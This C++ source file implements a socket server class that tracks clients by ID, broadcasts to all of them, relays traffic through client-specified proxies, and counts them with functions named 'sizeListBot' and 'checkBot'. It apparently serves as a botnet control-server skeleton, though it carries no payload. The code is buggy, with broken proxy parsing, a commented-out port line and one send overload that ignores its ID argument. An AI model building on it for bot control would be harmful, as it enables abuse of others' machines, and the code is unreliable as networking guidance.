//
// Created by MikoG on 07.10.2023.
//

#include "../../include/socket/server_socket.h"
#include <cstdint>
#include <thread>
#include <vector>
#include <fstream>

#include <iostream>

sys::SocketServer::SocketServer() {
    #ifdef _WIN32
        WSADATA wsa;

        if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
            this->_status = status::err_init_socket;
    #endif
}

sys::SocketServer::SocketServer(const uint16_t port) {
    this->port = port;

    #ifdef _WIN32
        WSADATA wsa;

        if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
            this->_status = status::err_init_socket;
    #endif
}

sys::SocketServer::SocketServer(const SocketServer& server) {
    this->_status = server._status;
    this->_mode   = server._mode;
    this->_type   = server._type;

    this->srv_header = server.srv_header;
    this->listClient = server.listClient;

    this->srv_socket = server.srv_socket;
    this->port       = server.port;

    #ifdef _WIN32
        WSADATA wsa;

        if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
            this->_status = status::err_init_socket;
    #endif
}

bool sys::SocketServer::socketInit() {
    if (this->_type == type::tcp_socket) {
        srv_socket = ::socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

        if (WIN(srv_socket == INVALID_SOCKET)
            LINUX(srv_socket < 0)) {
            this->_status = status::err_init_socket;

            return false;
        }
    }

    if (this->_type == type::udp_socket) {
        srv_socket = ::socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);

        if (WIN(srv_socket == INVALID_SOCKET)
            LINUX(srv_socket < 0)) {
            this->_status = status::err_init_socket;

            return false;
        }
    }

    srv_header.sin_addr WIN(.S_un.S_addr)LINUX(.s_addr) = htonl(INADDR_ANY);
    srv_header.sin_port = htons(port);
    srv_header.sin_family = AF_INET;

    int32_t result = ::bind(srv_socket, (const sockaddr *)&srv_header, sizeof(srv_header));

    if (WIN(result == SOCKET_ERROR)
        LINUX(result < 0)) {
        this->_status = status::err_bind_socket;

        return false;
    }

    if (this->_type == type::tcp_socket) {
        result = ::listen(srv_socket, 1024);

        if (WIN(result == SOCKET_ERROR)
                LINUX(result < 0)) {
            this->_status = status::err_bind_socket;

            return false;
        }
    }

    return true;
}

bool sys::SocketServer::socketListenConnection() {
    if (this->_mode == mode::single_thread) {
        Socket_t cli_socket;
        SockIn_t cli_header;
        SockLen_t  cli_size = sizeof(cli_header);

        Client client;

        cli_socket = ::accept(srv_socket, (sockaddr *)&cli_header, &cli_size);

        if (WIN(cli_socket == INVALID_SOCKET)
            LINUX(cli_socket < 0))
            return false;

        std::vector<char> buffer(__INT16_MAX__);

        if (recv(cli_socket, buffer.data(), 1, 0)) {
            if ((int)buffer.at(0) == -2) {
                client.setSocket(cli_socket);
                client.setHeader(cli_header);

                client.setCID();
            }

            else if ((int)buffer.at(0) == -1) {
                client.setSocket(cli_socket);
                client.setHeader(cli_header);

                client.setProxyHint();
                client.setCID();

                std::string address_proxy;
                std::string port_proxy;

                char separator = ':';
                bool s = false;
                bool proxy_failed = false;

                for (int i = 1; i < buffer.size(); i++) {
                    if (!s)
                        address_proxy.push_back(buffer.at(i));

                    else if (s)
                        port_proxy.push_back(buffer.at(i));

                    else if (buffer.at(i) == separator)
                        s = true;
                }

                SockIn_t proxy;

                proxy.sin_addr.WIN(S_un.S_addr)LINUX(s_addr) = inet_addr(address_proxy.c_str());
                //proxy.sin_port                               = htons((uint16_t)std::stoi(port_proxy));
                proxy.sin_family                             = AF_INET;

                Socket_t proxy_bus = ::socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

                if (WIN(proxy_bus == INVALID_SOCKET)LINUX(proxy_bus < 0))
                    proxy_failed = true;

                if (::connect(proxy_bus, (sockaddr *)&proxy, sizeof(proxy)) WIN(== SOCKET_ERROR)LINUX(< 0))
                    proxy_failed = true;

                if (!proxy_failed) {
                    std::vector<char> proxy_buffer(__INT16_MAX__);

                    std::thread([&]() -> void {
                        std::vector<char> proxy_cli_buffer(__INT16_MAX__);

                        while (recv(proxy_bus, proxy_cli_buffer.data(), __INT16_MAX__, 0)) {
                            if (!proxy_cli_buffer.empty())
                                if (!::send(cli_socket, proxy_cli_buffer.data(), proxy_cli_buffer.size(), 0)) {
                                    proxy_failed = true;
                                    break;
                                }
                        }

                        proxy_failed = true;
                    }).detach();

                    while (recv(cli_socket, proxy_buffer.data(), __INT16_MAX__, 0)) {
                        if (!proxy_buffer.empty())
                            if (!::send(proxy_bus, proxy_buffer.data(), proxy_buffer.size(), 0)) {
                                proxy_failed = true;
                                break;
                            }
                    }

                    proxy_failed = true;
                }

                else {
                    char proxy_mode = PROXY_MODE_FAILED;

                    send(cli_socket, &proxy_mode, 1, 0);
                }
            }

            if ((int)buffer.at(0) == PROXY_MODE_FAILED) {
                std::ofstream log("proxy_mode_log.log");

                if (log.is_open()) {
                    log << "[FAILED]Proxy mode don't enabled";

                    log.close();
                }

                else
                    log.close();
            }
        }

        listClient.push_back(client);
    }

    if (this->_mode == mode::multi_thread) {

    }

    return true;
}

std::vector<sys::ClientConnectionData> sys::SocketServer::getClients() {
    std::vector <ClientConnectionData> clConList;

    ClientConnectionData client;

    this->updateClient();

    for (auto& clCon : listClient) {
        client.host = clCon.getHost();
        client.port = htons(clCon.getPort());
        client.proxy_hint = clCon.getProxyHint();

        clConList.push_back(client);
    }

    return clConList;
}

std::vector<std::string> sys::SocketServer::getCID() {
    std::vector<std::string> listCID;

    this->updateClient();

    for (const auto& CID : listClient)
        listCID.push_back(CID.getCID().data());
    
    return listCID;
}

bool sys::SocketServer::Client::connectClient() {
    if (this->_type == type::tcp_socket) {
        cli_socket = ::socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

        if (WIN(cli_socket == INVALID_SOCKET)
            LINUX(cli_socket < 0))
            return false;

        int32_t result = ::connect(cli_socket, (const sockaddr *)&cli_header, sizeof(cli_header));

        if (WIN(result == SOCKET_ERROR)
            LINUX(result < 0))
            return false;

        std::thread([this]() -> void {
            int32_t bytes_read = 0;

            do {
                bytes_read = ::recv(cli_socket, cli_data.data(), 0xffff, 0);
            } while (bytes_read > 0);
        }).detach();
    }

    if (this->_type == type::udp_socket) {
        cli_socket = ::socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);

        if (WIN(cli_socket == INVALID_SOCKET)
            LINUX(cli_socket < 0))
            return false;

        std::thread([this]() -> void {
            int32_t bytes_read = 0;

            do {
                bytes_read = ::recvfrom(cli_socket, cli_data.data(), 0xffff, 0, nullptr, nullptr);
            } while (bytes_read > 0);
        }).detach();
    }

    return true;
}

bool sys::SocketServer::Client::disconnectClient() {
    WIN(closesocket(cli_socket))
    LINUX(close(cli_socket));

    #ifndef _WIN32
        shutdown(cli_socket, SHUT_RDWR);
    #endif // WIN64

    return true;
}

bool sys::SocketServer::Client::isConnected() {
    sockaddr_storage storage;

    SockLen_t storage_size = sizeof(storage);

    if (getpeername(this->cli_socket, (sockaddr *)&storage, &storage_size) == -1)
        return false;

    return true;
}

std::string sys::SocketServer::readClientData(const std::string& CID) {
    for (auto& clList : listClient) {
        if (clList.getCID().data() == CID)
            return clList.getData().data();
    }

    return "";
}

bool sys::SocketServer::connectBy(const std::string& CID) {
    for (auto& clList : listClient) {
        if (clList.getCID().data() == CID)
            return clList.connectClient();
    }

    return false;
}

bool sys::SocketServer::disconnectBy(const std::string& CID) {
    for (auto& clList : listClient)
        if (clList.getCID().data() == CID) {
            if (clList.isConnected())
                return clList.disconnectClient();

            else
                return true;
        }

    return false;
}

bool sys::SocketServer::disconnectAll() {
    bool returnResult = false;

    for (auto& clList : listClient) {
        if (clList.isConnected())
            returnResult = clList.disconnectClient();

        else
            return false;
    }

    return returnResult;
}

bool sys::SocketServer::sendBy(const std::string& CID, 
                               const void *message,
                               uint32_t size) {
    for (auto& clList : listClient) {
        if (clList.getCID().data() == CID)
            return clList.sendClientData((void *)message, size);
    }

    return false;
}

bool sys::SocketServer::sendBy(const std::string& CID,
                               const std::vector<char>& message) {
    for (auto& clList : listClient) {
        if (clList.getCID().data())
            return clList.sendClientData(message);
    }

    return false;
}

bool sys::SocketServer::sendBy(const std::string& CID, 
                               const std::string& message) {
    for (auto& clList : listClient) {
        if (clList.getCID().data() == CID)
            return clList.sendClientData(message);
    }

    return false;
}

uint64_t sys::SocketServer::sendAll(const void *message, uint32_t size) {
    bool returnResult = false;

    uint64_t failCount = 0;

    for (auto& clList : listClient) {
        returnResult = clList.sendClientData((void *)message, size);

        if (!returnResult)
            ++failCount;
    }

    return failCount;
}

uint64_t sys::SocketServer::sendAll(const std::vector<char>& message) {
    bool returnResult = false;

    uint64_t failCount = 0;

    for (auto& clList : listClient) {
        returnResult = clList.sendClientData(message);

        if (!returnResult)
            ++failCount;
    }

    return failCount;
}

uint64_t sys::SocketServer::sendAll(const std::string& message) {
    bool returnResult = false;

    uint64_t failCount = 0;

    for (auto& clList : listClient) {
        returnResult = clList.sendClientData(message);

        if (!returnResult)
            ++failCount;
    }

    return failCount;
}

bool sys::SocketServer::Client::sendClientData(void *message, uint32_t size) {
    int32_t result = 0;

    char *msg = (char *)message;

    if (this->isConnected()) {
        result = ::send(cli_socket, msg, size, 0);

        if (WIN(result == SOCKET_ERROR)LINUX(result < 0))
            return false;
    }

    if (!this->connectClient())
        return false;

    result = ::send(cli_socket, msg, size, 0);

    if (WIN(result == SOCKET_ERROR)LINUX(result < 0))
        return false;

    return true;
}

bool sys::SocketServer::Client::sendClientData(const std::vector<char>& message) {
    int32_t result = 0;

    if (this->isConnected()) {
        result = ::send(cli_socket, message.data(), message.size(), 0);

        if (WIN(result == SOCKET_ERROR)LINUX(result < 0))
            return false;
    }

    if (!this->connectClient())
        return false;

    result = ::send(cli_socket, message.data(), message.size(), 0);

    if (WIN(result == SOCKET_ERROR)LINUX(result < 0))
        return false;

    return true;
}

bool sys::SocketServer::Client::sendClientData(const std::string& message) {
    int32_t result = 0;

    if (this->isConnected()) {
        result = ::send(cli_socket, message.c_str(), message.size(), 0);

        if (WIN(result == SOCKET_ERROR)LINUX(result < 0))
            return false;

        return true;
    }

    if (!this->connectClient())
        return false;

    result = ::send(cli_socket, message.c_str(), message.size(), 0);

    if (WIN(result == SOCKET_ERROR)LINUX(result < 0))
        return false;

    return true;
}

uint64_t sys::SocketServer::sizeListBot() {
    return this->listClient.size();
}

uint64_t sys::SocketServer::checkBot() {
    uint64_t size = 0;

    for (auto& clList : listClient)
        if (clList.isConnected()) ++size;

    return size;
}

sys::SocketServer::~SocketServer() {
    this->listClient.clear();
    this->disconnectAll();
}

void sys::SocketServer::updateClient() {
    std::vector<Client> new_listClient;

    for (auto& clList : listClient)
        if (clList.isConnected())
            new_listClient.push_back(clList);

    this->listClient = new_listClient;
}